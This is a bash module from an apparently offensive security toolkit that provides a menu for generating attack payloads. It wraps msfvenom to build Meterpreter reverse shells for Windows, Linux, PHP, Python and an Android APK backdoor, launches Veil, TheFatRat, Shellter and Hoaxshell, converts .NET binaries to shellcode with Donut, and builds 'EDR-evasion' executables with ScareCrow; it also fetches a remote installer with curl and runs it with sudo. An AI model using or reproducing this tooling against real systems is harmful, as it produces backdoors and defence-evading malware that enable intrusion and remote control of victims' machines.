#!/usr/bin/env bash
# lib/modules/payload.sh — Payload generator module.

if [[ -n "${SANDEVISTAN_MODULE_PAYLOAD_LOADED:-}" ]]; then
    return 0
fi
SANDEVISTAN_MODULE_PAYLOAD_LOADED=1

# Re-use Metasploit installer from the exploitation module if loaded.
payload_install_metasploit() {
    if declare -F exploit_install_metasploit >/dev/null; then
        exploit_install_metasploit
    else
        local tmp
        tmp=$(mktemp)
        curl -fsSL \
            https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb \
            -o "$tmp"
        chmod 755 "$tmp"
        maybe_sudo "$tmp"
        rm -f "$tmp"
    fi
}

# ---------------------------------------------------------------------------
# MSFVenom
# ---------------------------------------------------------------------------

payload_msfvenom_generate() {
    local payload="$1" format="$2" default_name="$3"
    local lhost lport output
    lhost=$(prompt_value "Enter LHOST (your IP)")
    lport=$(prompt_value "Enter LPORT" "4444")
    output=$(prompt_value "Output filename" "$default_name")

    log_step "Generating ${payload} payload"
    msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f "$format" -o "$output"
    log_success "Payload saved to: ${output}"
}

payload_run_msfvenom() {
    ensure_command "msfvenom" "payload_install_metasploit" || return 0

    echo
    log_step "MSFVenom payload generator"
    echo -e "${BRIGHT_BLUE}[1]${RESET} Windows reverse shell (EXE)"
    echo -e "${BRIGHT_BLUE}[2]${RESET} Linux reverse shell (ELF)"
    echo -e "${BRIGHT_BLUE}[3]${RESET} PHP reverse shell"
    echo -e "${BRIGHT_BLUE}[4]${RESET} Python reverse shell"
    echo -e "${BRIGHT_BLUE}[5]${RESET} Android APK backdoor"
    echo -e "${BRIGHT_BLUE}[6]${RESET} List all payloads"
    echo -e "${BRIGHT_BLUE}[7]${RESET} Custom payload"

    local choice payload format output lhost lport
    read -rp "Select option: " choice
    case "$choice" in
        1)  payload_msfvenom_generate "windows/meterpreter/reverse_tcp" "exe" "payload.exe" ;;
        2)
            payload_msfvenom_generate "linux/x86/meterpreter/reverse_tcp" "elf" "payload.elf"
            chmod +x payload.elf 2>/dev/null || true
            ;;
        3)  payload_msfvenom_generate "php/meterpreter/reverse_tcp" "raw" "payload.php" ;;
        4)  payload_msfvenom_generate "python/meterpreter/reverse_tcp" "raw" "payload.py" ;;
        5)  payload_msfvenom_generate "android/meterpreter/reverse_tcp" "raw" "payload.apk" ;;
        6)
            log_step "Available payloads"
            msfvenom --list payloads | less
            ;;
        7)
            payload=$(prompt_value "Enter payload (e.g., windows/shell/reverse_tcp)")
            lhost=$(prompt_value "Enter LHOST")
            lport=$(prompt_value "Enter LPORT" "4444")
            format=$(prompt_value "Enter format (exe, elf, raw, ...)")
            output=$(prompt_value "Output filename")
            log_step "Generating custom payload"
            msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f "$format" -o "$output"
            log_success "Payload saved to: ${output}"
            ;;
        *)  log_warn "Invalid selection" ;;
    esac
}

# ---------------------------------------------------------------------------
# Veil-Framework
# ---------------------------------------------------------------------------

payload_install_veil() {
    log_step "Running Veil setup (this may take a while)"
    run_in_dir "${SANDEVISTAN_TOOLS_DIR}/Veil" maybe_sudo ./config/setup.sh --force --silent
}

payload_run_veil() {
    local dest="${SANDEVISTAN_TOOLS_DIR}/Veil"
    ensure_repo \
        "https://github.com/Veil-Framework/Veil.git" \
        "$dest" \
        "payload_install_veil" || return 0

    log_step "Launching Veil-Evasion"
    run_in_dir "$dest" ./Veil.py
}

# ---------------------------------------------------------------------------
# TheFatRat
# ---------------------------------------------------------------------------

payload_install_fatrat() {
    local dest="${SANDEVISTAN_TOOLS_DIR}/TheFatRat"
    log_step "Running TheFatRat installer"
    chmod +x "${dest}/setup.sh"
    run_in_dir "$dest" maybe_sudo ./setup.sh
}

payload_run_fatrat() {
    local dest="${SANDEVISTAN_TOOLS_DIR}/TheFatRat"
    ensure_repo \
        "https://github.com/screetsec/TheFatRat.git" \
        "$dest" \
        "payload_install_fatrat" || return 0

    log_step "Launching TheFatRat"
    run_in_dir "$dest" ./fatrat
}

# ---------------------------------------------------------------------------
# Shellter
# ---------------------------------------------------------------------------

payload_run_shellter() {
    ensure_command "shellter" "install_apt shellter" || return 0
    log_info "Shellter requires Windows PE files as input."
    if prompt_yesno "Launch Shellter now?"; then
        shellter
    fi
}

# ---------------------------------------------------------------------------
# Hoaxshell
# ---------------------------------------------------------------------------

payload_run_hoaxshell() {
    local dest="${SANDEVISTAN_TOOLS_DIR}/hoaxshell"
    ensure_repo \
        "https://github.com/t3l3machus/hoaxshell.git" \
        "$dest" \
        "install_pip_requirements ${dest}" || return 0

    local lhost lport
    lhost=$(prompt_value "Enter your IP (LHOST)")
    lport=$(prompt_value "Enter port" "8080")
    log_info "Hoaxshell generates a PowerShell payload to deliver to the target."
    log_step "Starting Hoaxshell server"
    run_in_dir "$dest" python3 hoaxshell.py -s "$lhost" -p "$lport"
}

# ---------------------------------------------------------------------------
# Donut
# ---------------------------------------------------------------------------

payload_install_donut() {
    local dest="${SANDEVISTAN_TOOLS_DIR}/donut"
    install_git "https://github.com/TheWover/donut.git" "$dest"
    log_step "Building Donut"
    run_in_dir "$dest" make
    run_in_dir "$dest" maybe_sudo make install
}

payload_run_donut() {
    local donut_cmd=""
    if command -v donut >/dev/null 2>&1; then
        donut_cmd=$(command -v donut)
    elif [[ -x "${SANDEVISTAN_TOOLS_DIR}/donut/donut" ]]; then
        donut_cmd="${SANDEVISTAN_TOOLS_DIR}/donut/donut"
    else
        log_warn "Donut is not installed."
        if ! prompt_yesno "Install from GitHub?"; then return 0; fi
        payload_install_donut || return 0
        donut_cmd="${SANDEVISTAN_TOOLS_DIR}/donut/donut"
    fi

    local input_file output
    input_file=$(prompt_value "Enter .NET EXE/DLL file path")
    [[ -z "$input_file" ]] && { log_warn "Input file is required."; return 0; }
    output=$(prompt_value "Output shellcode file" "payload.bin")
    log_step "Converting to shellcode"
    "$donut_cmd" -f "$input_file" -o "$output"
    log_success "Shellcode saved to: ${output}"
}

# ---------------------------------------------------------------------------
# ScareCrow
# ---------------------------------------------------------------------------

payload_run_scarecrow() {
    if ! command -v ScareCrow >/dev/null 2>&1 && [[ ! -x "${HOME}/go/bin/ScareCrow" ]]; then
        log_warn "ScareCrow is not installed."
        if ! prompt_yesno "Install via Go?"; then return 0; fi
        install_go "github.com/optiv/ScareCrow@latest" || return 0
    fi
    local scarecrow_cmd
    scarecrow_cmd=$(command -v ScareCrow || echo "${HOME}/go/bin/ScareCrow")

    local shellcode domain output
    shellcode=$(prompt_value "Enter shellcode file path")
    domain=$(prompt_value "Enter domain for signing (optional)")
    output=$(prompt_value "Output filename" "payload.exe")

    log_step "Generating EDR-evasion payload"
    if [[ -z "$domain" ]]; then
        "$scarecrow_cmd" -I "$shellcode" -O "$output"
    else
        "$scarecrow_cmd" -I "$shellcode" -domain "$domain" -O "$output"
    fi
    log_success "Payload saved to: ${output}"
}

# --- menu -------------------------------------------------------------------

payload_menu() {
    clear
    display_ascii_info
    draw_banner "PAYLOAD GENERATOR"

    local options=(
        "1) MSFVenom"
        "2) Veil-Framework"
        "3) TheFatRat"
        "4) Shellter"
        "5) Hoaxshell"
        "6) Donut"
        "7) ScareCrow"
        "99) Back to Main Menu"
    )
    render_options "${options[@]}"
    close_banner

    local sub_choice
    shell_prompt
    read -r sub_choice

    case "$sub_choice" in
        1)  payload_run_msfvenom ;;
        2)  payload_run_veil ;;
        3)  payload_run_fatrat ;;
        4)  payload_run_shellter ;;
        5)  payload_run_hoaxshell ;;
        6)  payload_run_donut ;;
        7)  payload_run_scarecrow ;;
        99) log_step "Returning to Main Menu"; sleep 1; clear; return ;;
        *)  log_warn "Invalid selection"; sleep 1; clear; return ;;
    esac

    press_enter_to_continue
}
